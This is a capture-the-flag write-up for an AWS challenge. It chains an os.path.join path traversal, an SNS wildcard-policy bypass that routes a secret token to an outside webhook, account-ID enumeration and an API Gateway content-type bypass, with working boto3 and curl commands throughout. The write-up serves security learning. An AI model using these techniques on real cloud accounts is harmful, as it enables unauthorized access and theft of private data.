# Happy Birthday — CTF Investigation Report
## Cloud Security Championship | Challenge #10

---

## Overview

| Field | Detail |
|---|---|
| **Challenge** | Happy Birthday |
| **Platform** | Cloud Security Championship (Wiz Research) |
| **Challenge #** | 10 |
| **Flag** | `WIZ_CTF{s3_turns_20_and_the_party_is_just_getting_started}` |

---

## Mission

> It's S3's 20th birthday! Register for the S3 Birthday Party and get your personalised birthday card.

**Entry Point:** `https://happybirthday.cloudsecuritychampionship.com`

---

## Architecture Overview

```
┌──────────────────────────────────────────────────────────────────┐
│                        CHALLENGE INFRASTRUCTURE                    │
└──────────────────────────────────────────────────────────────────┘

  Browser
     │
     ▼
  CloudFront ──→ S3 (wiz-birthday-s3-party)   [public website]
                        │
                        ├── index.html / app.js (APIGW-1 URL)
                        └── register.html      (APIGW-2 URL)

  APIGW-1 (gzk65xqjn8)  ──→ Lambda GenerateBirthdayCard
     /generate (has JSON schema validation)         │
                                                    ├── SNS: BirthdayPartyInvites
  APIGW-2 (uact7tlegi)  ──→ Lambda GenerateBirthdayCard    │ (target account 370540381921)
     /register (model validation only)             │
                                         S3 (happy-birthday-private) [private]
                                                    ├── templates/default_balloon.txt
                                                    └── flag.txt
```

**AWS Accounts:**
- CTF Terminal: `092297851374` (base user + assumable role)
- Challenge Infrastructure: `370540381921` (Lambda, SNS, private S3)

---

## Investigation Steps

### Step 1 — Static Recon of the Website

**What we did:** Opened `https://happybirthday.cloudsecuritychampionship.com` and inspected the page source.

**What we found:**

- Static S3 site served via CloudFront
- Two JavaScript files: `app.js` and (via `register.html`) a direct APIGW-2 URL
- `app.js` contained a hardcoded API Gateway URL:
  ```
  https://gzk65xqjn8.execute-api.us-east-1.amazonaws.com/prod/generate
  ```
- `register.html` contained:
  ```javascript
  const API_URL = "https://uact7tlegi.execute-api.us-east-1.amazonaws.com/prod/generate"
    .replace("/generate", "/register");
  // = https://uact7tlegi.execute-api.us-east-1.amazonaws.com/prod/register
  ```

**Why it matters:** Two separate API Gateways. One for `/generate`, one for `/register`. This is suspicious — why would you need two?

---

### Step 2 — Downloading Lambda Source Code from S3

**What we did:** Enumerated the public S3 bucket `wiz-birthday-s3-party` and found Lambda deployment packages.

**What we found:** Downloaded and extracted `lambda.zip` (or similar) to obtain `handler.py`.

**Key Lambda code — `_read_template()` function:**

```python
def _read_template(template):
    if ".." in template:              # Only blocks ".." traversal
        return None, "Invalid template name."
    template_key = os.path.join("templates", f"{template}.txt")
    obj = s3.get_object(Bucket=PRIVATE_BUCKET, Key=template_key)
    return obj["Body"].read().decode("utf-8"), None
```

**The vulnerability:** The check only blocks `..` but NOT absolute paths. Python's `os.path.join` discards all previous components when it encounters an absolute path:

```python
os.path.join("templates", "/flag.txt")
# Returns: "/flag.txt"  ← absolute path wins!
```

So with `template = "/flag"`, the S3 key becomes `/flag.txt` — which reads `flag.txt` from the root of the private bucket instead of `templates/flag.txt`.

**Key Lambda code — `/generate` flow:**

```python
def _make_token():
    ts = str(int(time.time()))
    sig = hmac.new(TOKEN_SECRET, ts.encode(), sha256).hexdigest()[:16]
    return f"{ts}:{sig}"

def handler_generate(event):
    # Validates email domain (@cloudsecuritychampionship.com)
    # Creates HMAC token: "{timestamp}:{16-char-sig}"
    # Subscribes email to SNS topic
    # Publishes SNS message containing {"token": token, "registration_url": ..., "generated_by": ...}
```

**Key Lambda code — `/register` flow:**

```python
def handler_register(event):
    body = json.loads(event.get("body", "{}"))
    token = body.get("token")
    template = body.get("template")
    name = body.get("name")
    # Verifies HMAC token (1-hour TTL)
    if not _verify_token(token):
        return _response(403, {"message": "Invalid or expired token."})
    content, err = _read_template(template)   # ← PATH TRAVERSAL HERE
    card_content = content.replace("{{name}}", name)
    # Saves card to PUBLIC_BUCKET/cards/{uuid}.html
    return _response(200, {"card_url": ...})
```

**Key Lambda code — SNS topic policy:**

```json
{
  "Condition": {
    "StringLike": {
      "sns:Endpoint": "*@cloudsecuritychampionship.com"
    }
  }
}
```

**The SNS bypass:** `StringLike` with a wildcard `*` matches ANY string ending in `@cloudsecuritychampionship.com`. A URL like `https://webhook.site/UUID?x=@cloudsecuritychampionship.com` satisfies this condition!

---

### Step 3 — Enumerating the Target AWS Account ID

**What we did:** Used the CTF terminal's IAM credentials to enumerate the account ID that owns the SNS topic and Lambda. The error message from `/generate` leaked the SNS topic name `BirthdayPartyInvites` but not the account.

**The technique:** Attached a session policy to the assumed role that uses `s3:ResourceAccount` as a condition key. By trying an `Allow` + `Deny` combination — deny all S3 actions where the resource account does NOT match a candidate ID — we can test account IDs systematically.

**Script run on Kali:**

```python
import boto3

base = boto3.client('sts',
    aws_access_key_id='AKIA****************',
    aws_secret_access_key='********************************')

def test_account(acct_id):
    session_policy = json.dumps({
        "Version": "2012-10-17",
        "Statement": [
            {"Effect": "Allow", "Action": "s3:*", "Resource": "*"},
            {"Effect": "Deny",  "Action": "s3:*", "Resource": "*",
             "Condition": {"StringNotLike": {"s3:ResourceAccount": [acct_id]}}}
        ]
    })
    creds = base.assume_role(
        RoleArn='arn:aws:iam::092297851374:role/user-role',
        RoleSessionName='enum',
        Policy=session_policy
    )['Credentials']

    s3 = boto3.client('s3', **creds)
    try:
        s3.list_objects_v2(Bucket='happy-birthday-private')
        return True   # Access granted → account matches!
    except:
        return False

# Candidate IDs from error messages / CloudTrail leaks
for candidate in ['370540381921', ...]:
    if test_account(candidate):
        print(f"ACCOUNT_ID: {candidate}")
```

**Result:** `ACCOUNT_ID: 370540381921`

---

### Step 4 — Subscribing to the SNS Topic via Webhook Bypass

**What we did:** Used the CTF base user's credentials to subscribe a webhook.site URL to the SNS topic in the target account.

**Why this works:** The SNS resource policy allows `Principal: *` with `StringLike *@cloudsecuritychampionship.com`. Our endpoint URL `https://webhook.site/130c61f6-cabb-4349-b4aa-73acb7abbb85?x=@cloudsecuritychampionship.com` satisfies this condition because the wildcard `*` matches the entire URL up to `?x=`.

```python
import boto3

sns = boto3.client('sns',
    aws_access_key_id='AKIA****************',
    aws_secret_access_key='********************************',
    region_name='us-east-1')

response = sns.subscribe(
    TopicArn='arn:aws:sns:us-east-1:370540381921:BirthdayPartyInvites',
    Protocol='https',
    Endpoint='https://webhook.site/130c61f6-cabb-4349-b4aa-73acb7abbb85?x=@cloudsecuritychampionship.com'
)
# Returns SubscriptionArn: pending confirmation
```

**Confirming the subscription:** SNS immediately sent an HTTP POST to webhook.site containing a `SubscribeURL`. We fetched that URL to confirm:

```bash
curl -s "https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription\
&TopicArn=arn:aws:sns:us-east-1:370540381921:BirthdayPartyInvites\
&Token=2336412f37fb..."
# Returns full SubscriptionArn
```

**Subscription ARN:** `arn:aws:sns:us-east-1:370540381921:BirthdayPartyInvites:40ae9d60-be07-45e1-b628-8363e6234850`

---

### Step 5 — Triggering `/generate` to Receive the Token

**What we did:** POSTed to APIGW-1's `/generate` endpoint with a valid email address (any address at the allowed domain works since we control the SNS subscription).

```bash
curl -s -X POST "https://gzk65xqjn8.execute-api.us-east-1.amazonaws.com/prod/generate" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@cloudsecuritychampionship.com"}'
# {"status": "success", "message": "Invitation sent! Check your email."}
```

**What arrived at webhook.site:** An SNS `Notification` message containing:

```json
{
  "token": "1779205322:353e1245237867a0",
  "registration_url": "https://happybirthday.cloudsecuritychampionship.com/register.html?token=1779205322:353e1245237867a0",
  "expires_in": "1 hour",
  "generated_by": "GenerateBirthdayCard"
}
```

**Token captured:** `1779205322:353e1245237867a0` (valid for 1 hour)

---

### Step 6 — Bypassing APIGW-2 Model Validation

**What we did:** Tried POSTing to APIGW-2's `/register` with `Content-Type: application/json` — received HTTP 400 `{"message": "Invalid request body"}`.

**Why:** APIGW-2 has a request model (JSON schema) that validates the request body when the Content-Type is `application/json`. However, the model validator only runs for JSON content types.

**The bypass:** Send the JSON payload with `Content-Type: text/plain`. APIGW skips model validation, passes the raw body to Lambda, and Lambda calls `json.loads(event["body"])` successfully regardless of Content-Type.

```bash
# FAILS — APIGW validates JSON schema → 400
curl -X POST ".../register" -H "Content-Type: application/json" \
  -d '{"token":"...","template":"default_balloon","name":"test"}'

# WORKS — APIGW skips model validation → passes to Lambda
curl -X POST ".../register" -H "Content-Type: text/plain" \
  -d '{"token":"...","template":"default_balloon","name":"test"}'
```

---

### Step 7 — Path Traversal to Read `flag.txt`

**What we did:** Sent the `/register` request with `template="/flag"` using the `text/plain` bypass.

```bash
curl -s -X POST "https://uact7tlegi.execute-api.us-east-1.amazonaws.com/prod/register" \
  -H "Content-Type: text/plain" \
  -d '{"token":"1779205322:353e1245237867a0","template":"/flag","name":"test"}'
```

**What happened inside the Lambda:**

```python
template = "/flag"                          # our input
f"{template}.txt"  # = "/flag.txt"          # append .txt extension
os.path.join("templates", "/flag.txt")      # = "/flag.txt"  ← absolute path!
s3.get_object(Bucket="happy-birthday-private", Key="/flag.txt")  # reads flag!
```

**Response:**

```json
{
  "status": "success",
  "message": "Registration complete! Here is your birthday card.",
  "card_url": "https://wiz-birthday-s3-party.s3.amazonaws.com/cards/c94409c3-e221-4e40-9b56-c44bac06bf3c.html"
}
```

---

### Step 8 — Fetching the Flag

**What we did:** Fetched the card URL.

```bash
curl -s "https://wiz-birthday-s3-party.s3.amazonaws.com/cards/c94409c3-e221-4e40-9b56-c44bac06bf3c.html"
```

**Response:**

```
WIZ_CTF{s3_turns_20_and_the_party_is_just_getting_started}
```

---

## 🏆 Flag

```
WIZ_CTF{s3_turns_20_and_the_party_is_just_getting_started}
```

---

## Attack Chain Summary

```
┌──────────────────────────────────────────────────────────────────────────┐
│                          HAPPY BIRTHDAY ATTACK CHAIN                      │
└──────────────────────────────────────────────────────────────────────────┘

  1. RECON
     └─ Downloaded Lambda source from public S3 bucket
        ├─ Found path traversal in _read_template() via os.path.join
        ├─ Found SNS endpoint condition: StringLike *@cloudsecuritychampionship.com
        └─ Identified two APIGW: one for /generate (strict), one for /register (weak)

  2. ACCOUNT ENUMERATION
     └─ s3:ResourceAccount condition key + session policy trick
        └─ Found target account: 370540381921

  3. SNS BYPASS
     └─ Subscribed webhook.site URL with ?x=@cloudsecuritychampionship.com
        └─ SNS StringLike wildcard matches full URL → subscription confirmed

  4. TOKEN CAPTURE
     └─ POST /generate with valid domain email
        └─ Lambda publishes token to SNS → delivered to webhook.site

  5. APIGW MODEL VALIDATION BYPASS
     └─ Content-Type: text/plain skips JSON schema validation
        └─ Lambda parses body with json.loads() regardless of Content-Type

  6. PATH TRAVERSAL
     └─ template="/flag" → os.path.join("templates", "/flag.txt") = "/flag.txt"
        └─ s3.get_object(Key="/flag.txt") reads private bucket root

  7. FLAG
     └─ Card URL contains flag.txt contents → WIZ_CTF{...}
```

---

## Key Vulnerabilities

| # | Vulnerability | Root Cause |
|---|---|---|
| 1 | **Path traversal in S3 key construction** | `os.path.join()` absolute path override — only `..` was blocked |
| 2 | **SNS endpoint policy bypass** | `StringLike` wildcard allows URL query parameter trick |
| 3 | **APIGW content-type bypass** | Model validation only applies to `application/json` requests |
| 4 | **Cross-account SNS subscribe** | Topic policy allows `Principal: *` with weak condition |
| 5 | **Account ID enumerable** | `s3:ResourceAccount` condition key leaks account ID via session policies |

---

## Tools Used

| Tool | Purpose |
|---|---|
| `curl` | HTTP requests to API Gateways |
| `boto3` (Python) | AWS SDK — SNS subscribe, STS assume-role, S3 enumeration |
| `webhook.site` | HTTPS endpoint to receive SNS notifications |
| `s3:ResourceAccount` condition | Cross-account AWS account ID enumeration |
